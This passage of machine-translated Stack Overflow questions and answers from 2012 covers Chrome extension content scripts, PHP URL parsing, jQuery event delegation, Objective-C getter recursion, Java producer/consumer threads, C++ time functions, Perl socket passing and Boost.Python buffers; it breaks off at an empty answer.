> 赞同：2
> 
> 时间：2012-05-01T19:38:25.040
> 
> 标签：google-chrome-extension, content-script

我正在尝试开发一个 Chrome 浏览器扩展，它在上下文菜单上做有趣的事情。问题是，我无法在 manifest.json content_scripts 中加载 JS 文件。

我没有收到错误，文件根本不加载。

脚本很好，如果我将它们放在我的背景页面中，它们会通过该背景页面很好地触发。缺点是它仅限于背景页面。

```
{
"name": "Mini",
"description": "Mini",      
"permissions": ["contextMenus","management","contentSettings","tabs","http://*/*","https://*/*","editable"],
"version": "0.1",
"manifest_version": 1,
"background_page": "mini.html",
"icons" : {"16" : "mini.png"},
"contexts" : ["link","tab","page"],
"content_scripts": [{"matches":["<all_urls>"],"js":["jquery172min.js","mini.js"]}]
} 
```

我尝试了所有形式的比赛，包括`"http://\*/\*", "https://\*/\*", "\*://\*/\*"`

我试过空格，没有空格。我在这里画一个空白。

任何帮助，将不胜感激。

```
$(document).ready(function () {

alert("page is ready");
},true); 
```

对此我深表歉意。这是我用来测试扩展是否已加载的 javascript/Jquery 的副本。这只是一个简单的警报。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-02T09:10:02.657

[内容脚本](http://code.google.com/chrome/extensions/content_scripts.html)不能使用[`chrome.contextMenus`](http://code.google.com/chrome/extensions/contextMenus.html)API​​（实际上这些只能使用[部分`chrome.extension`方法](http://code.google.com/chrome/extensions/extension.html#content%20scripts)）。

可以将[匹配模式](http://code.google.com/chrome/extensions/match_patterns.html)应用于单个菜单项，通过[`chrome.contextMenus.create({title: 'Test', documentUrlPatterns: 'http://*/*'});`](http://code.google.com/chrome/extensions/contextMenus.html#method-create).
创建的菜单项也可以修改 ( [`chrome.contextMenus.update`](http://code.google.com/chrome/extensions/contextMenus.html#method-update)) 和删除 ( [`chrome.contextMenus.remove`](http://code.google.com/chrome/extensions/contextMenus.html#method-remove))。

要在内容脚本和后台页面之间进行通信，请参阅[消息传递](http://code.google.com/chrome/extensions/messaging.html)。

# iphone - 如何在横向模式下自定义日期选择器

> ID：10403241
> 
> 赞同：0
> 
> 时间：2012-05-01T19:38:46.990
> 
> 标签：iphone, landscape, uidatepicker

我在横向模式下有日期选择器。我调整了它的坐标以适应横向模式。

但它看起来像**imageA**但我希望它看起来像**imageB**。我怎样才能做到这一点。

**图A。**

![在此处输入图像描述](../Images/4aef596b1ef04b1551e3a1b59a5818b0.png)

**图B。** ![在此处输入图像描述](../Images/a2e238146ada45e242057db6fb8c2e4d.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-01T19:50:58.543

看看这是否有帮助 -

[iPhone Landscape-Only Utility-Template 应用程序](https://stackoverflow.com/questions/525737/iphone-landscape-only-utility-template-application)

[http://www.llamagraphics.com/developer/UIDatePicker.html](http://www.llamagraphics.com/developer/UIDatePicker.html)

[iPhone UIDatePicker 处于横向模式？](https://stackoverflow.com/questions/2331752/iphone-uidatepicker-in-landscape-mode)

# php - 从 php 中生成的 url 字符串中删除不需要的查询

> ID：10403250
> 
> 赞同：1
> 
> 时间：2012-05-01T19:39:59.993
> 
> 标签：php, split

我有以下字符串为我的网站上的音乐播放器生成 mp3 url。

```
<?php echo $song->getTitle() ?> 
```

这导致**/public/music_song/df/74/746b_2112.mp3?c=ec1e**

我想从导致**/public/music_song/df/74/746b_2112.mp3的字符串中删除查询**

我已经研究了如何拆分 url，但我还远不是一个 php 天才，所以我不知道拆分或使用 preg_replace 的天气，也不知道如何将它合并到我现有的字符串中。

我必须摆脱这些查询，它们是不需要的，并且每天都会使我的数据库崩溃。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-01T19:41:32.450

```
list($keep) = explode('?', '/public/music_song/df/74/746b_2112.mp3?c=ec1e'); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-01T20:51:13.460

```
$parsedInput = parse_url('/public/music_song/df/74/746b_2112.mp3?c=ec1e');
echo $parsedInput['path'];
// Results in /public/music_song/df/74/746b_2112.mp3 
```

编辑：由于我没有使用 SocialEngine，我猜你需要做的是：

```
<?php $parsed = parse_url($song->getFilePath());
      echo $this->htmlLink($parsed['path'], 
                           $this->string()->truncate($song->getTitle(), 50), 
                           array('class' => 'music_player_tracks_url', 
                                 'type' => 'audio', 
                                 'rel' => $song->song_id )); ?> 
```

# ios - iPhone顶部小工具第一次绘制时被切断

> ID：10403251
> 
> 赞同：0
> 
> 时间：2012-05-01T19:40:00.073
> 
> 标签：ios, ipad

我正在尝试在我的 iPad 应用上放置广告。我将 y 绳网设为零。似乎第一次绘制 add 时，它是从最顶部开始绘制的 y 坐标系。因此，具有电池电量和互联网强度的酒吧被吸引了。如果您点击添加，然后返回应用程序，则添加在电池强度条下方的黎明时分，y 线仍然为零。

如果我将 y 设置为 60，起初它看起来不错，但是当您单击添加栏然后返回添加时，添加会在电池条下方 60 像素处绘制，而不是在它的正下方。

似乎有时 y 从屏幕的最顶部开始，然后在电池拉伸条的正下方开始。

一定有办法解决这个问题，......

代码

```
- (void)viewDidLoad
{
    [super viewDidLoad];
    // Do any additional setup after loading the view from its nib.

    // AddCode
    adView = [[ADBannerView alloc] initWithFrame:CGRectZero];
    adView.requiredContentSizeIdentifiers = [NSSet setWithObject:ADBannerContentSizeIdentifierPortrait];
    adView.currentContentSizeIdentifier = ADBannerContentSizeIdentifierPortrait;
    [self.view addSubview:adView];
    adView.delegate=self;
    bannerIsVisible=NO;

}
 // i removes all the code to make sure nothing was messing it up
@end 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-01T19:55:03.893

我怀疑，如果您使用它，您会发现问题在于应用程序以纵向以外的方向启动（横向或倒置）。

`wantsFullScreenLayout`我有一个非常相似的问题，并且能够通过摆弄我的 UIViewController 子类上的属性来让它工作。此属性的文档似乎暗示正确的值为 NO，但请尝试在主视图控制器上将其设置为 YES。

# javascript - 将事件附加到使用 jQuery 动态添加的元素

> ID：10403252
> 
> 赞同：0
> 
> 时间：2012-05-01T19:40:00.437
> 
> 标签：javascript, jquery

这是我的代码：

```
$("#strong-against .pick .data .actions .btn-success").on("click", function () {
    //Magic here.
}); 
```

我读到我应该使用`.on()`它，因为即使在文档完成加载后，它也会动态地将事件附加到添加的项目上。

然而，在我动态加载这些项目后，事件并没有被触发。我怎样才能让我在文档加载后添加的任何项目都被收听？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-05-01T19:43:49.233

尝试，

```
$(document).on("click", "#strong-against .pick .data .actions .btn-success", function () {
    //Magic here.
}); 
```

按照 2 个步骤为动态元素绑定事件处理程序，

1.  查找要动态添加元素的最近的父元素。
2.  使用动态元素选择器作为第二个参数将处理程序绑定到父元素。

因此，如果`#strong-against`页面加载时存在，那么您可以，

```
 $("#strong-against").on("click", ".pick .data .actions .btn-success", function () {
    //Magic here.
 }); 
```

# objective-c - 为什么我不能在 Objective C 中以这种方式初始化 getter？

> ID：10403259
> 
> 赞同：0
> 
> 时间：2012-05-01T19:40:39.567
> 
> 标签：objective-c, ios, xcode, getter, self

我有点困惑为什么我不能以这种方式初始化吸气剂：

```
@synthesize stack = _stack;

- (NSMutableArray *) stack
{
    if (self.stack == nil) {
        self.stack = [[NSMutableArray alloc] init];
    }
    return self.stack;
} 
```

我知道如果我用_stack 替换self.stack，它会工作得很好，但我就是不知道为什么我不能使用self.stack。我稍后在代码中使用 self.stack 没有问题。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-01T19:44:40.510

问题出在以下行：

```
if (self.stack == nil) 
```

这相当于

```
if ([self stack] == nil) 
```

所以你在自己内部调用你的getter方法，这会导致无限递归。您可以通过寻址 ivar 本身来删除调用 getter：

```
- (NSMutableArray *) stack
{
    if (_stack == nil) {
        _stack = [[NSMutableArray alloc] init];
    }
    return _stack;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-01T19:44:18.047

`self.stack`调用您正在创建的吸气剂。通过`self.stack`在 getter 方法中使用，您正在创建一个无限循环，这是不可取的。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-01T19:44:38.593

调用此行时

```
if (self.stack == nil) { 
```

它返回到确切的方法并创建了一个无限循环。只需删除自我。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-01T19:48:45.977

你写的相当于：

```
- (bool) thisIsTrue
{
      if ([self thisIsTrue])
      {
          //
      }
} 
```

显然，该函数*一遍又一*遍地调用自己，创建一个**无限循环**并导致**崩溃**。

# haskell - 在 Haskell 中按函数结果对列表进行排序

> ID：10403261
> 
> 赞同：0
> 
> 时间：2012-05-01T19:40:51.977
> 
> 标签：haskell

我正在尝试使用`sortBy`and来订购一个列表`compare`，但是我遇到了比较表达式的问题。我需要它根据 filmRating 函数返回的平均值对列表进行排序。

```
formattedByYear :: Int -> String
formattedByYear year = concatMap formatString $ sortBy (compare filmRating) $ filmsByYear year

filmRating :: Film -> Float
filmRating (Film _ _ _ ratings)
      | ratings == [] = 0.0
      | otherwise = average (map snd ratings) 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-01T19:49:10.623

你想要的功能是`Data.Ord.comparing`.

```
Prelude> :t Data.Ord.comparing
Data.Ord.comparing :: Ord a => (b -> a) -> b -> b -> Ordering 
```

# jquery - 无法使用 jayq 绑定到 keydown 事件

> ID：10403264
> 
> 赞同：2
> 
> 时间：2012-05-01T19:41:09.447
> 
> 标签：jquery, clojure, clojurescript

我正在尝试使用 jayq 来允许我将 jquery 与 clojurescript 一起使用。

由于某种原因，此代码有效。

```
(bind ($ :#canvas) :mousedown
      (fn []
        (.log js/console (str "Why mouse but no keys?")))) 
```

但这段代码没有。

```
(bind ($ :#canvas) :keydown
      (fn []
        (.log js/console (str "hit")))) 
```

是否有任何原因无法正确捕获 keydown 事件

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-01T23:10:41.487

您必须使画布具有焦点，否则它将不会收到任何事件。为此，只需给它一个制表符：

```
<canvas id="canvas" tabindex="1" /> 
```

# bash - 重命名 Shell 脚本的输出

> ID：10403265
> 
> 赞同：0
> 
> 时间：2012-05-01T19:41:11.553
> 
> 标签：bash, shell

我正在尝试创建一个脚本来运行另一个脚本并从输出中更改名称。

这是到目前为止的脚本：

```
#! /bin/bash

i=1

for N in mediainput.iso mediainput2.iso
do
    x264transcode $N
    mv $N $((i++))
done 
```

这不太好。它只是移动文件并重命名它们。

我需要先运行 x264transcode，然后重命名它的输出。因为当 x264transcode 处理文件时，它们都具有相同的名称。

将文件更改为 1 然后 2 等等的名称是可以的。

但是，如果有一种方法可以获取文件所在文件夹的名称或文件本身，那将是一个加号。也许在它们之间进行选择以用于不同的场景。

下面的例子：

1.  〜/视频/暑假2009/dvd.iso
2.  x264 的输出：VIDEO01.mkv
3.  重命名脚本的输出：Summer-Vation-2009.mkv

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-01T19:46:23.740

x264transcode 是否总是调用其输出 VIDEO01.mkv？所有的视频文件都是 dvd.iso 吗？如果是这样，类似这样，也可以使用连字符获得正确的文件名：

```
cd ~/Videos
for I in */dvd.iso
do
  x264transcode $I
  mv VIDEO01.mkv `dirname $I|tr ' ' -`.mkv
end 
```

这是假设 x264transcode 将 VIDEO01.mkv 存储在当前目录而不是其输入文件所在的目录。

# maven - Maven、Ant、依赖解析、如何在另一个项目中调用目标

> ID：10403269
> 
> 赞同：0
> 
> 时间：2012-05-01T19:41:41.820
> 
> 标签：maven, ant

我想在一个 Maven 项目中“扩展”另一个 Maven 项目中定义的 ant 目标。

基础项目“Project 1”定义了一个 ant 构建文件，目标“BaseDB”调用一组创建数据库模式的 SQL 脚本。这个项目由 Maven 构建到一个包含 ant build.xml 和相关 SQL 脚本的 Jar 中。

我想用一个 ant 构建文件定义一个“项目 2”，其目标是“ExtensionDB”，其依赖 =“BaseDB,LocalUpdateDB”。也就是说，ExtensionDB 通过引用合并了 BaseDB 定义。

我玩弄了 xmlns:artifact="antlib:org.apache.maven.artifact.ant" 提供的依赖扩展，却无法解析 Project1/Build.xml 中的任何内容（更不用说它所依赖的 SQL 脚本了） )

有任何想法吗

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-01T21:10:53.530

我会尝试使用一个生命周期挂钩，从其 jar 中提取原始 Project1/Build.xml 并将其放在可以从 Project2 build.xml 引用它的地方。

（我不确定我是否完全理解您要执行的操作，但我希望 ant 扩展能够解决任务（Java 代码），而不是 build.xml 文件本身。）

# phpunit - 我无法让 VisualPHPUnit 运行我的测试

> ID：10403270
> 
> 赞同：0
> 
> 时间：2012-05-01T19:41:46.297
> 
> 标签：phpunit

我按照这里的描述安装了[VisualPHPUnit 。](http://mattmueller.me/blog/phpunit-test-report-unit-testing-in-the-browser)我正在使用 XAMPP。

定义('PEAR_PATH', 'c:\xampp\php\pear'); 定义（'TEST_DIRECTORY'，'C:\xampp\htdocs\visualphpunit\tests'）；

当我运行时，我看不到任何文字，只有格式良好的空白。还没有找到任何其他报告 VisualPHPUnit 屏幕呈现空的人。

左侧显示“

```
VisualPHPUnit
测试----------
选项  -  -  -  -  -  - 
档案 ------------
图表 -------------

```

而右边是一大块空白。

从命令行运行 phpunit 工作正常。

```
C:\xampp\htdocs>phpunit visualphpunit\tests
Sebastian Bergmann 的 PHPUnit 3.6.10。

..foo {breaks: this } barI.some stuffFsome stuffES

时间：0秒，内存：3.25Mb

有 1 个错误：

C:\xampp\htdocs\visualphpunit\tests\PUTest.php:8
C:\xampp\php\phpunit:46

失败！
测试：7，断言：5，失败：1，错误：1，不完整：1，跳过：1。

C:\xampp\htdocs>

```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-23T05:52:34.333

NSinopoli（VisualPHPUnit 的开发者）在这里。

强烈建议在[项目的问题跟踪器](https://github.com/NSinopoli/VisualPHPUnit/issues)上报告 VPU 的任何错误/问题。

也就是说，@edorian 的诊断是不正确的——在你的测试中有输出并**不会**破坏 VPU。（它实际上是在包含它的测试结果下方收集和呈现的。）

“当我运行时，我看不到任何文本，只有格式良好的空白” - 在单击“运行测试”之前，您是否在文件选择器中选择了任何测试？在不选择任何测试的情况下运行 VPU 将使您得到您所描述的空白。如果不是这种情况，您是否在选择任何“选项”的情况下运行测试？如果是这样，则可能存在阻止正确呈现结果的配置问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-05T12:22:58.760

您在测试中有输出。据我所知，这会破坏 VisualPHPUnit，因为它会损坏 VisualPHPUnit 使用的 json 日志文件。

从测试中删除输出，它应该可以工作

# javascript - 是否不需要循环执行 executeSql 命令的结果？

> ID：10403274
> 
> 赞同：0
> 
> 时间：2012-05-01T19:41:54.257
> 
> 标签：javascript, mustache

这里有很多代码，但问题与底部的 for 循环有关。

```
var dbo = openDatabase('xxx','1.0','myDatabase', 1048576);
var DropTableDeferred = new $.Deferred();
var CreateTableDeferred = new $.Deferred();
var InsertDeferred = new $.Deferred();
var SelectDeferred = new $.Deferred();
dbo.transaction(function(myTrans) {
    myTrans.executeSql(
        'drop table myTable;'
        ,[]
        ,DropTableDeferred.resolve()
    );
});
DropTableDeferred.done(function() {
    dbo.transaction(function(myTrans) {
        myTrans.executeSql(
            'CREATE TABLE IF NOT EXISTS myTable' 
            + '(xxxID Integer NOT NULL PRIMARY KEY'
            + ',xxxName Varchar(128)'
            + ');'
            ,[]
            ,CreateTableDeferred.resolve()
        );
    });
});
CreateTableDeferred.done(function() {
    dbo.transaction(function(myTrans) {
        myTrans.executeSql("INSERT INTO myTable(xxxID,xxxName) VALUES(1,'A')");
        myTrans.executeSql("INSERT INTO myTable(xxxID,xxxName) VALUES(2,'B')");
        myTrans.executeSql(
            "INSERT INTO myTable(xxxID,xxxName) VALUES(3,'C')",
            [],
            InsertDeferred.resolve()
        );
    });
});

InsertDeferred.done(function() {
    dbo.transaction(function(myTrans) {
        myTrans.executeSql(
            'SELECT * FROM myTable',
            [], 
            function(tx, result) {
                SelectDeferred.resolve(result);
            }
        );
    });
});

SelectDeferred.done(function(result) {
    var X = $('#result-template').html();
    var template = Handlebars.compile(X);
    var data = [];

    for(var i=0;i < result.rows.length; i++) {
        data.push(result.rows.item(i));
    }
    $('ul').append(template(data));
}); 
```

Q: 调用template(data)是否需要建立一个数据数组，或者我可以直接传递result变量吗？

通过“结果变量”，我的意思是：result.rows，或 result.rows.item，或其他一些组合。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-01T19:48:46.237

恕我直言，你可以，但说实话，你可以花更少的时间去尝试然后发布问题。试试看嘛：

```
$('ul').append(template(result.rows)); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-01T19:49:20.493

是的，该值已直接在我的仅 html&javascript 项目中传递。在下面的代码中，我得到了 Sql 的结果并填充了一个下拉框的选项。

```
 function fillLectureFromDB(tx) {
        tx.executeSql('SELECT * FROM LECTURE', [], successFill, errorFill);
    }
    function successFill(tx, results) {
        var len = results.rows.length;
        for (var i=0; i<len; i++){
            var elOptNew = document.createElement('option');
            elOptNew.text = results.rows.item(i).code;
            elOptNew.value = results.rows.item(i).code;
            var elSel = document.getElementById('slExCode');
            elSel.add(elOptNew, null);  
        }
    } 
```

# wpf - 在使用数据上下文时设置显式源更新

> ID：10403277
> 
> 赞同：1
> 
> 时间：2012-05-01T19:42:09.193
> 
> 标签：wpf

我只需要在按钮单击事件期间使用控件值更新绑定源对象。

但是由于我的顶层设置了数据上下文，所以只要控制值发生变化，它就会更新源对象......是否可以在该事件期间显式设置以更新它，只保持数据上下文不变？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-02T08:26:29.653

文本框绑定：

```
<TextBox x:Name="myTextBox" Text="{Binding MyTextProperty, UpdateSourceTrigger=Explicit}"/> 
```

按钮处理程序代码：

```
myTextBox.GetBindingExpression(TextBox.TextProperty).UpdateSource(); 
```

# java - 生产者/消费者线程不给出结果

> ID：10403286
> 
> 赞同：0
> 
> 时间：2012-05-01T19:42:49.067
> 
> 标签：java, multithreading, producer-consumer, consumer

我正在为我的操作系统课程做一个 CPU 调度模拟器项目。该程序应由两个线程组成：生产者线程和消费者线程。生产者线程包括在系统中生成进程的生成器和选择多个进程并将它们放入ReadyQueue 类型的称为Buffer 的对象（消费者和生产者共享对象）中的长期调度程序。消费者线程包括短期调度程序，它从队列中获取进程并启动调度算法。我在不使用线程的情况下编写了整个程序并且它工作正常，但现在我需要添加线程并且我从未使用过线程，所以如果有人能告诉我如何修改我在下面显示的代码以实现所需的线程，我将不胜感激。

这是 Producer 类的实现：

```
public class Producer extends Thread{

    ReadyQueue Buffer = new ReadyQueue(20); // Shared Buffer of size 20 between consumer and producer  
    JobScheduler js = new JobScheduler(Buffer);

    private boolean systemTerminate = false; // Flag to tell Thread that there are no more processes in the system 

    public Producer(ReadyQueue buffer) throws FileNotFoundException{
        Buffer = buffer;
        Generator gen = new Generator();   // Generator generates processes and put them in a vector called memory     
        gen.writeOnFile();
    }

    @Override
    public  void run() {

        synchronized(this){
            js.select();  // Job Scheduler will select processes to be put in the Buffer

            Buffer = (ReadyQueue) js.getSelectedProcesses();

            while(!Buffer.isEmpty()){      
                try {
                    wait();     // When Buffer is empty wait until getting notification
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
                systemTerminate = js.select();
                Buffer = (ReadyQueue) js.getSelectedProcesses();
                if(systemTerminate)     // If the flag's value is true the thread yields
                    yield();
            }
        }
    }   

    public ReadyQueue getReadyQueue(){
        return Buffer;
    }
} 
```

这是 Consumer 类的实现：

```
public class Consumer extends Thread{

    ReadyQueue Buffer = new ReadyQueue(20);
    Vector<Process> FinishQueue = new Vector<Process>();
    MLQF Scheduler ;
    public Consumer(ReadyQueue buffer){
        Buffer = buffer;
        Scheduler = new MLQF(Buffer,FinishQueue);   // An instance of the multi-level Queue Scheduler
    }

    @Override
    public  void run() {
        int count = 0;         // A counter to track the number of processes

        while(true){
            synchronized(this){
                Scheduler.fillQueue(Buffer);    // Take contents in Buffer and put them in  a separate queue in the scheduler
                        Scheduler.start();              // Start Scheduling algorithm
                count++;
            }
            if(count >= 200)   // If counter exceeds the maximum number of processes thread must yeild
                yield();
            notify();               // Notify Producer thread when buffer is empty
        }
    }

    public void setReadyQueue(ReadyQueue q){
        Buffer = q;
    }
} 
```

这是主线程：

```
public class test {

    public static void main(String[] args) throws FileNotFoundException,InterruptedException {       
        ReadyQueue BoundedBuffer = new ReadyQueue(20);
        Producer p = new Producer(BoundedBuffer);
        Consumer c = new Consumer(p.getReadyQueue());
        p.start();
        System.out.println("Ready Queue: "+p.getReadyQueue());
        p.join();
        c.start();
        c.join();
        }
} 
```

先感谢您。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-01T19:50:59.647

您的代码的一个问题是它在多线程生产者/消费者模型中存在一个常见错误。您*必须*环顾`while`四周`wait()`。例如：

```
try {
    // we must do this test in a while loop because of consumer race conditions
    while(!Buffer.isEmpty()) {
        wait();     // When Buffer is empty wait until getting notification
        ...
    }
} catch (InterruptedException e) {
    e.printStackTrace();
} 
```

问题是，如果您有多个正在使用的线程，您可能`notify`是一个线程，但随后另一个线程通过并将刚刚添加的项目出列。当一个线程在收到通知后从 WAIT 队列移动到 RUN 队列时，通常会被放在队列的末尾，可能在其他等待同步的线程之后`this`。

有关这方面的更多详细信息，请参阅我的[有关 this 的文档](http://256stuff.com/gray/docs/misc/producer_consumer_race_conditions/)。

# c++ - 什么是编写嵌套二进制分支逻辑的可读方式

> ID：10403290
> 
> 赞同：3
> 
> 时间：2012-05-01T19:43:07.927
> 
> 标签：c++, c, boolean-logic

我有一些看起来像的逻辑

```
if(a){
 if(b){
  if(c){
    //do something
  }else{
    //do something
  }    
 }else{
  if(c){
    //do something
  }else{
    //do something
  }    
 }else{
 if(b){
  if(c){
    //do something
  }else{
    //do something
  }    
 }else{
  if(c){
    //do something
  }else{
    //do something
  }    
} 
```

将其实现为可读逻辑的最佳方法是什么？我不想做一些大的 OOP 手术来使它可读，因为做某事只是一个衬里。赞赏 C/C++ 中的解决方案

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-01T19:53:15.900

由于条件是布尔值，并且显然是独立的，因此将它们视为单词中的位`switch`：

```
#include <cstdio>

#define COMPOSE(a,b,c) ( ((!!(a)) << 2) | ((!!(b))<<1) | (!!(c)) )

int f(int i, int j, int k) {

  switch(COMPOSE( i==j, i+j<k, k!=42)) {
  case COMPOSE(true, true, true):
    printf("yo\n");
    break;
  case COMPOSE(true, true, false):
    printf("ye\n");
    break;
  case COMPOSE(true, false, true):
    printf("ya\n");
    break;
  }
}

int main () {
  f(1,1,1);
} 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-05-01T19:54:45.750

如果一切`//do something`都根本不同，那么您没有太多选择（afaik）。

对于代码风格，我更喜欢

```
if ( a && b && c ) 
{
}
else if ( a && b && !c )
{
}
else if ( a && !b && c )
... 
```

这消除了多级缩进的必要性，并明确了实际满足哪个条件。

旁注：显然`a && b && !c`可以表示为`a && b`因为`!(a && b && c)`和使用else if。无论如何我都会把它留在那里，因为编译器可能会优化它并且代码看起来更干净。

# jira - jira greenhopper 快速板发布

> ID：10403295
> 
> 赞同：0
> 
> 时间：2012-05-01T19:43:25.960
> 
> 标签：jira, greenhopper

我正在玩 greenhopper 的评估，并设置了一个看板快速板，它有一个主桶和几个泳道。完成列中的发布按钮将完成列中的任何 Jira 添加到发布中。

有没有办法用那个按钮释放一条泳道？因此，即使我们已经在我的主要工作桶中完成了 Jira，我可能只想自己发布一个紧急补丁。如果释放按钮有更多的控制，那就太好了，这样我就可以快速释放某个车道。

或者是吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-27T03:50:33.977

从我所见，我认为不存在仅释放一条单独的泳道的能力。黑客可能是创建一个临时板并将其限制为您要发布的票证。显然不是最佳实践，但由于 Greenhopper 的 Rapid Board 功能仍然是绿色的，我们发现一些 hack 可能是目前完成不太主流的事情的唯一方法。

# perl - 在 Perl 中的进程之间共享套接字（没有分叉）？

> ID：10403297
> 
> 赞同：1
> 
> 时间：2012-05-01T19:43:31.370
> 
> 标签：perl, sockets

Perl 中是否有一种机制可以在两个独立的进程之间共享一个套接字——在 Linux 中无需分叉或线程？

我认为不会，但这个答案让我相信这是可能的：[https ://stackoverflow.com/a/1139425/1170839](https://stackoverflow.com/a/1139425/1170839)

我想在一个进程上创建一个监听套接字，并允许另一个进程接受/读/写它。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-01T19:57:52.943

正如您发布的链接所示，在许多 UNIXy 系统上，文件描述符可能会通过本地域套接字传递。例如，特权进程可以打开/准备一个 fd，然后将其发送给非特权进程以供使用。

[Socket::MsgHdr](http://search.cpan.org/dist/Socket-MsgHdr/lib/Socket/MsgHdr.pm)为 perl 公开了此功能，并包含文件描述符传递的示例。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-05-01T19:53:46.367

要走的路是使用POE。POE 使 perl 中的多线程变得非常容易，并且就是为此而设计的。POE 是用于事件驱动的多线程应用程序的 CPAN 框架。毫无疑问，在 Perl 中执行此操作的最简单和最好的方法是 POE。当这一切都已经完成并且经过很好的测试时，没有理由重新发明它。

看：

[http://poe.perl.org/?Evolution_of_a_POE_Server](http://poe.perl.org/?Evolution_of_a_POE_Server)和 [http://poe.perl.org/?POE_Cookbook/TCP_Servers](http://poe.perl.org/?POE_Cookbook/TCP_Servers)

# c++ - c++中的时间函数

> ID：10403303
> 
> 赞同：-3
> 
> 时间：2012-05-01T19:44:00.160
> 
> 标签：c++, timer

我需要计算自年初以来经过的秒数。我对我发现的所有时间函数有点困惑。

我想也许可以使用计时器（从 1970 年 1 月 1 日开始查找秒数），但我该如何继续使用这个计时器？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-01T19:47:48.017

默认情况下，C++ 只能访问可以说是丑陋的`<ctime>`库，但您仍然可以摆脱它：

1.  调用`time`以获取当前时间`time_t`（=几乎普遍地，自 1970 年 1 月 1 日以来经过的秒数，即 UNIX 纪元）；
2.  使用;将给定时间转换为`struct tm`（具有各种时间组件 - 年、月、... - 拆分的结构）`localtime`
3.  更改此`struct tm`设置以使其转到当年年初；
4.  调用`mktime`将给定的转换回`struct tm`a `time_t`；现在你有`time_t`今年年初的。
5.  `time_t`用 ; 从您在第 1 点获得的值中减去该值`difftime`；现在你有自年初以来经过的秒数。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-01T19:48:58.997

我认为你的意思是`time`功能。是的，你可以使用它。更具体地说，请看以下内容：

*   `time`（返回当前时间）
*   `localtime`（将当前时间解码为更容易获得年、月等的形式）
*   `struct tm`（什么`localtime`返回）
*   `mktime`（从 a 转换回`struct tm`a `time_t`）
*   `difftime`（以秒为单位计算两个`time_t`s 之间的差异）。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-01T19:52:46.143

```
#include <ctime>

double seconds_since_year_began()
{
    time_t now = std::time(NULL);
    tm* tmp = std::localtime(&now);
    tm t = {0};
    t.tm_year = tmp->tm_year;
    return std::difftime(now, std::mktime(&t));
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-01T19:50:42.070

```
#include <ctime> 
```

看看这里的例子：

[http://www.cplusplus.com/reference/clibrary/ctime/mktime/](http://www.cplusplus.com/reference/clibrary/ctime/mktime/)

您想使用它来获取 1 月 1 日 0:00 的“纪元以来的秒数”，并从`time()`.

# python - Boost.Python：在 Python 中填充传入的缓冲区

> ID：10403305
> 
> 赞同：2
> 
> 时间：2012-05-01T19:44:02.507
> 
> 标签：python, buffer, boost-python, void-pointers, py++

我想知道是否可以在 Python 中填充缓冲区（具有以下条件），如果可以，如何？

我有一个 C++ 缓冲区，我需要填写 Python。缓冲区的地址是通过`GetAddress`返回指向缓冲区地址的**void 指针**的方法获得的。

```
#include <boost/smart_ptr/shared_ptr.hpp>
class Foo
{
public:
    Foo(const unsigned int length)
    {
        m_buffer = boost::shared_ptr< unsigned char >( new unsigned char[ length ] );
    }

    ~Foo(){}

    void* GetAddress( ) const
    {
        // cast for the sake of this question
        return reinterpret_cast< void* >( m_buffer.get() );
    }

private:
    boost::shared_ptr< unsigned char > m_buffer;
    Foo();
    Foo(const Foo&);
}; 
```

使用 Py++，我可以生成 Boost.Python 包装器以将类导出到 Python，如下所示：

```
#include "boost/python.hpp"
#include "foo.hpp"

namespace bp = boost::python;

BOOST_PYTHON_MODULE(MyWrapper){
    { //::Foo
        typedef bp::class_< Foo, boost::noncopyable > Foo_exposer_t;
        Foo_exposer_t Foo_exposer = Foo_exposer_t( "Foo", bp::init< unsigned int >(( bp::arg("length") )) );
        bp::scope Foo_scope( Foo_exposer );
        bp::implicitly_convertible< unsigned int const, Foo >();
        { //::Foo::GetAddress

            typedef void * ( ::Foo::*GetAddress_function_type )(  ) const;

            Foo_exposer.def( 
                "GetAddress"
                , GetAddress_function_type( &::Foo::GetAddress )
                , bp::return_value_policy< bp::return_opaque_pointer >() );

        }
    }
} 
```

在 Python 中，GetAddress 的输出是指向内存地址的 void *：

```
>>> import MyWrapper
>>> foo = MyWrapper.Foo(100)
>>> address = foo.GetAddress()
>>> print address
<void * object at 0x01E200B0>
>>> 
```

问题是 Python 不允许我对 void * 地址对象做任何事情。如果我尝试访问缓冲区中的第二个元素，则以下操作均无效：

```
>>> address + 1
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
TypeError: unsupported operand type(s) for +: 'void *' and 'int'
>>> address[1]
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
TypeError: 'void *' object is unsubscriptable
>>> 
```

环境：Visual Studio 2008、Boost 1.44、gcc-xml 0.9.0、py++ 1.0.0、pygccxml 1.1.0、Python 2.6.6

* * *

## 回答 #1

> 赞同：2
